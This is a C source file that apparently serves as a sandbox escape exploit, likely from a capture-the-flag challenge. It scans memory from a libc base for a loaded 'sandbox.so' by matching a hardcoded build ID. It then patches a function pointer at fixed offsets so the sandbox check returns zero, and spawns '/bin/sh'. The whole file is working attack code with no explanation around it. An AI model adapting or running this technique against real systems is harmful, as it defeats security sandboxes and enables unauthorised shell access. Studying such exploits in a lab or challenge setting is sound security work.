#include <sys/mman.h>

static int _strlen(const char *str) {
    int l;
    for (l = 0; str[l]; l++);
    return l;
}

static void print(const char *str) {
    sys_write(1, str, _strlen(str));
}

static void println(const char *str) {
    print(str);
    print("\n");
}

int _memcmp(const void* s1, const void* s2,size_t n) {
    const unsigned char *p1 = s1, *p2 = s2;
    while(n--)
        if( *p1 != *p2 )
            return *p1 - *p2;
        else
            p1++,p2++;
    return 0;
}

int main() {
    const char *a[] = {"/bin/sh", 0};
    unsigned long libcbase = LIBC_BASE;

    //sandbox.so buildid
    const unsigned char buildid[] = {4, 0, 0, 0, 20, 0, 0, 0, 3, 0, 0, 0, 71, 78, 85, 0, 207, 179, 11, 145, 70, 244, 195, 26, 178, 65, 170, 30, 70, 246, 43, 55, 128, 114, 66, 144};

    unsigned long addr;
    unsigned long start = libcbase;
    unsigned long len = 16LL * 1024 * 1024 * 1024;
    for (addr = start; addr < start + len; addr += 0x1000) {
        if (sys_write(1, (char *)addr, 1) == 1) {
            //readable
            if (*((unsigned char*)addr) == 0x7f) {
                if (_memcmp(buildid, (char *)(addr + 0x1c8), sizeof(buildid)) == 0) {
                    println("sandbox.so found");
                    unsigned long *clientIntData = (unsigned long*)(addr + 0xa4f460);
                    clientIntData[0x690 / 8] = addr + 0x588870; //return 0

                    sys_execve(*a, a, 0);

                    break;
                }
            }
        }
    }

    sys__exit(1);
}

